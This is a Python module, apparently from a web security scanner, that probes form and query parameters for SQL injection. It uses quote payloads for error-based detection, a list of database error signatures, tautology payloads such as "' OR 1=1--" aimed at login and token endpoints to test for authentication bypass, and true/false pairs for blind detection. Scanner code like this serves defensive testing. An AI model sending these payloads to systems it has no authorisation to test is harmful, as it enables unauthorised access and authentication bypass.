import html
import time
from urllib.parse import urlparse

from backend.core.auth_helper import resolve_target_cookies
from backend.core.param_filters import is_user_parameter
from backend.core.request_handler import RequestHandler
from backend.core.url_utils import is_valid_url, normalize_url

SQLI_ERROR_PATTERNS = [
    "sql syntax",
    "mysql error",
    "sql exception",
    "odbc error",
    "unclosed quotation mark",
    "you have an error in your sql syntax",
    "syntax error",
    "sqlite3.operationalerror",
    "psycopg2.errors",
    "postgresql query failed",
    "mysql_fetch",
    "mysql_query",
    "warning: pg_",
    "warning: mysqli_",
    "mariadb server version",
    "check the manual that corresponds to your",
    "quoted string not properly terminated",
    "unterminated quoted string",
    "ora-01756",
    "ora-00933",
    "pg_query",
    "microsoft oledb provider for odbc drivers",
    "microsoft ole db provider for sql server",
    "unclosed quotation mark after the character string",
    "database error",
    "db error",
]

MAX_TESTS = 80


def _extract_form_defaults(form):
    defaults = {}
    for inp in form.get("inputs", []):
        name = inp.get("name")
        if name:
            defaults[name] = inp.get("value", name)
    return defaults


def _injection_points(forms, target_url, parameters):
    """Yield (url, method, content_type, param_name, extra_fields) tuples to test."""
    if parameters:
        urls = {target_url}
        for form in forms:
            action = normalize_url(form.get("action", target_url))
            if is_valid_url(action):
                urls.add(action)

        action_defaults = {}
        action_ct = {}
        for form in forms:
            act = normalize_url(form.get("action", target_url))
            action_defaults[act] = _extract_form_defaults(form)
            action_ct[act] = form.get("content_type", "form")

        seen_get = set()
        for url in urls:
            defaults = action_defaults.get(url, {})
            ct = action_ct.get(url, "form")
            for pname in parameters:
                if not is_user_parameter(pname):
                    continue
                key = (url, "get", pname)
                if key not in seen_get:
                    seen_get.add(key)
                    extra = {k: v for k, v in defaults.items() if k != pname}
                    yield url, "get", ct, pname, extra

        seen_post = set()
        for form in forms:
            action = normalize_url(form.get("action", target_url))
            method = form.get("method", "get").lower()
            if method != "post" or not is_valid_url(action):
                continue
            defaults = _extract_form_defaults(form)
            ct = form.get("content_type", "form")
            for pname in parameters:
                if not is_user_parameter(pname):
                    continue
                key = (action, "post", pname)
                if key not in seen_post:
                    seen_post.add(key)
                    extra = {k: v for k, v in defaults.items() if k != pname}
                    yield action, "post", ct, pname, extra
        return

    # No explicit parameters provided: extract from discovered forms and endpoints
    seen_endpoints = set()
    for form in forms:
        action = normalize_url(form.get("action", target_url))
        method = form.get("method", "get").lower()
        if not is_valid_url(action):
            continue
        defaults = _extract_form_defaults(form)
        content_type = form.get("content_type", "form")
        for inp in form.get("inputs", []):
            pname = inp.get("name")
            if not is_user_parameter(pname):
                continue
            key = (action, method, pname)
            if key in seen_endpoints:
                continue
            seen_endpoints.add(key)
            extra = {k: v for k, v in defaults.items() if k != pname}
            yield action, method, content_type, pname, extra


def _send(handler, method, action, data, content_type="form"):
    try:
        if method == "post":
            if content_type == "json":
                return handler.post(action, json=data)
            return handler.post(action, data=data)
        return handler.get(action, params=data)
    except Exception:
        return None


def scan(forms, target_url, parameters=None, cookies=None, headers=None, **kwargs):
    findings = []
    cookies = resolve_target_cookies(target_url, cookies=cookies)
    handler = RequestHandler(cookies=cookies, headers=headers)
    tests = 0

    for action, method, content_type, inp_name, extra in _injection_points(forms, target_url, parameters):
        if tests >= MAX_TESTS:
            break

        # 1. Baseline Request (with benign input)
        benign = "1"
        base_data = {**extra, inp_name: benign}
        base_resp = _send(handler, method, action, base_data, content_type)
        tests += 1

        # If posting form-encoded gave 400 or 500 on a POST request, check if endpoint expects JSON
        if method == "post" and content_type == "form" and (base_resp is None or base_resp.status_code in (400, 415, 500)):
            json_resp = _send(handler, method, action, base_data, "json")
            if json_resp is not None and json_resp.status_code != 415:
                content_type = "json"
                base_resp = json_resp

        if base_resp is None or not base_resp.text:
            continue
        base_text = base_resp.text.lower()

        # Baseline error patterns check
        baseline_hits = {p for p in SQLI_ERROR_PATTERNS if p in base_text}

        # 2. Error-Based SQLi Probes
        error_payloads = ["'", "1'", "\"", "1\""]
        found_sqli = False

        for payload in error_payloads:
            if tests >= MAX_TESTS:
                break
            inj_data = {**extra, inp_name: payload}
            inj_resp = _send(handler, method, action, inj_data, content_type)
            tests += 1
            if inj_resp is None or not inj_resp.text:
                continue
            inj_text = inj_resp.text.lower()

            new_hits = [p for p in SQLI_ERROR_PATTERNS if p in inj_text and p not in baseline_hits]
            if new_hits:
                findings.append(
                    {
                        "severity": "high",
                        "url": action,
                        "detail": (
                            f"SQL Injection detected on parameter '{inp_name}'. "
                            f"Database error signature '{new_hits[0]}' appeared after "
                            f"injecting payload '{payload}'."
                        ),
                        "payload": payload,
                    }
                )
                found_sqli = True
                break
            time.sleep(0.02)

        if found_sqli:
            continue

        # 3. Authentication Bypass / Tautology Probes (for login, auth, or password reset endpoints)
        is_auth_point = any(k in action.lower() or k in inp_name.lower() for k in ("login", "auth", "user", "pass", "token", "signin"))
        if is_auth_point:
            auth_bypass_payloads = [
                "admin' OR 1=1--",
                "' OR 1=1--",
                "admin' OR '1'='1",
                "' OR '1'='1",
                "\" OR 1=1--",
            ]
            for bp in auth_bypass_payloads:
                if tests >= MAX_TESTS:
                    break
                bp_data = {**extra, inp_name: bp}
                # Ensure password fields contain a dummy non-empty string
                for k, v in bp_data.items():
                    if "pass" in k.lower() and not v:
                        bp_data[k] = "dummyPassword123!"

                bp_resp = _send(handler, method, action, bp_data, content_type)
                tests += 1
                if bp_resp is None:
                    continue

                bp_text = bp_resp.text.lower()
                bp_cookies = getattr(bp_resp, "cookies", {})

                # Check if authentication succeeded:
                # - Status code 200/302 where baseline was 401/403/error
                # - Session/token cookie issued that wasn't in baseline
                # - Response body contains success/login indicators ("login successful", "welcome", "token", "jwt", "account")
                # - OR returned database error pattern
                auth_success_markers = ["login successful", "token", "welcome", "jwt", "success", "account_number", "dashboard"]
                baseline_had_success = any(m in base_text for m in ("login successful", "welcome", "jwt"))

                got_new_token = any("token" in c.lower() or "session" in c.lower() for c in bp_cookies)
                status_elevated = (bp_resp.status_code == 200 and base_resp.status_code in (401, 403))
                body_elevated = (not baseline_had_success and any(m in bp_text for m in auth_success_markers))

                if (status_elevated or body_elevated or got_new_token) and bp_resp.status_code != 500:
                    findings.append(
                        {
                            "severity": "critical",
                            "url": action,
                            "detail": (
                                f"SQL Injection Authentication Bypass detected on parameter '{inp_name}'. "
                                f"Injecting tautological payload '{bp}' caused the server to grant authentication "
                                f"or issue an access token without valid credentials."
                            ),
                            "payload": bp,
                        }
                    )
                    found_sqli = True
                    break

        if found_sqli:
            continue

        # 4. Boolean-Based Blind SQLi Check
        # Compare TRUE condition vs FALSE condition
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"

        resp_true = _send(handler, method, action, {**extra, inp_name: true_payload}, content_type)
        resp_false = _send(handler, method, action, {**extra, inp_name: false_payload}, content_type)
        tests += 2

        if resp_true is not None and resp_false is not None:
            # Check 1: Status code differential (e.g. TRUE returns 200 matching baseline, FALSE returns 404 or 500)
            status_diff = (resp_true.status_code != resp_false.status_code) and (resp_true.status_code == base_resp.status_code)

            # Check 2: Content differential (stripping injected payload strings to prevent reflection false positives)
            clean_true = (resp_true.text or "").replace(true_payload, "").replace(html.escape(true_payload), "")
            clean_false = (resp_false.text or "").replace(false_payload, "").replace(html.escape(false_payload), "")
            content_diff = (clean_true != clean_false) and (resp_true.status_code == base_resp.status_code)

            if status_diff or content_diff:
                findings.append(
                    {
                        "severity": "high",
                        "url": action,
                        "detail": (
                            f"Blind (Boolean-based) SQL Injection on parameter '{inp_name}'. "
                            f"Application response changed between TRUE condition ('{true_payload}') "
                            f"and FALSE condition ('{false_payload}')."
                        ),
                        "payload": true_payload,
                    }
                )

        time.sleep(0.02)

    return findings
